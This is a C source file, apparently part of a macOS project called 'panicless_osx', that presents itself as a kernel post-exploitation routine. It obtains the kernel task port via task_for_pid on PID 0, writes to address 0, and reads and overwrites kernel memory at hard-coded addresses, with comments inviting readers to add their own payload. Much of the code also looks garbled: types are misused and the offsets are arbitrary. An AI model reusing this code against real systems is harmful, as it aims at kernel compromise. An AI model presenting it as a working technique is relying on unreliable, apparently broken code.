//
//  postExploit.c
//  panicless_osx
//
//  Created by ali on 2.03.2021.
//

#include "postExploit.h"

#define PANIC_LOG(fmt)\
printf("[panicless_osx] ");\
printf(fmt);\
printf("\n");

#define msleep(time)\
sleep(time);

thread_state_t ppc_state;
mach_msg_type_number_t sc = MACHINE_THREAD_STATE_COUNT;
long thread = 0; // for first thread

uint64_t task_f;
kern_return_t orig;

mach_port_t createPort(){
  
    //printf("[msg] creating a fake task\n");
    mach_port_t    kernel_task;
            kern_return_t  err;
            long           value = 0;
     
    PANIC_LOG("lets move in the dangly sketchy exploit");
         
            err = task_for_pid(mach_task_self(),0,&kernel_task);
            if ((err != KERN_SUCCESS) || !MACH_PORT_VALID(kernel_task))
                PANIC_LOG("getting kernel task.");
            // Write values to stack.
            if(vm_write(kernel_task, (vm_address_t) 0x0, (vm_address_t)&value, 10))
                        PANIC_LOG("writing argument to dlopen.");
    
            printf("[+] done!\n");
    task_f=mach_task_self()|0x100000;
    orig=err;
    return kernel_task;
}
int exploit(void){
    mach_port_t fake_task=createPort();
 
    PANIC_LOG("exploring fake kernel_task abilities");
    msleep(2);
   
    printf("[exploit] kernel_task %s\n", mach_error_string(fake_task));
    printf("[+] kernel_task -> 0x%llu\n",task_f);
    uint32_t spray=0x0fffffff;
    uint64_t spray64=100;
    k_write32(fake_task, 0x2000|0x100000, spray);
    k_write64(fake_task, 0x2000, spray64);
    
    
    /*/
     ARBITARY READ MEMORY LEAK
    /*/
    
    k_read32(fake_task, 0x1337, 10);
    k_read32(fake_task, 0x2337, 10);
    
    /*/
     ALL DONE SENDS YOU HERE
    /*/
    
    PANIC_LOG("fun part here (lets have some fun?)");
    printf("info -> %d\n",k_read32(fake_task, 0x120|0x1000000, 10));
    
    printf("info -> %d\n",k_read32(fake_task, 0x420|0x1000000, 10));
    printf("info -> %d\n",k_read32(fake_task, 0x120|0x1000000, 10));
    printf("info -> %d\n",k_read32(fake_task, 0x3483, 10));
    
    k_write32(fake_task, 0x3483, 0x20);
    printf("info -> %d\n",k_read32(fake_task, 0x3483, 10));
    
    uint32_t wefun=k_read32(fake_task, 0x3483, 10);
    uint32_t wefun_pac=wefun|0x0ffffff;
    printf("[*] wefun -> 0x%u\n",wefun);
    printf("[*] wefun_pac -> 0x%u\n",wefun_pac);
    
    /*/
     WF_PAC TESTING
    /*/
    
    printf("wefun_pac_orig -> %d\n",k_read32(fake_task, wefun_pac+0x10, 8));
    k_write32(fake_task, wefun_pac+0x10, 0x1337); // PATCH IT
    printf("wefun_pac_patched -> %d\n",k_read32(fake_task, wefun_pac+0x10, 8));
    
    /*/
     IMPLEMENT OTHER STUFF YOURSELF
     K_READ32 IS ABIT DANGLY FOR NOW.
     GONNA MAKE A WRITEUP FOR IT.
    /*/
    
    PANIC_LOG("ADD YOUR STUFF HERE");
    
    PANIC_LOG("CLEANUP...");
    task_suspend(orig);
    printf("[+] cleanup %s\n","kk");
  
    
    return (int)fake_task;
}
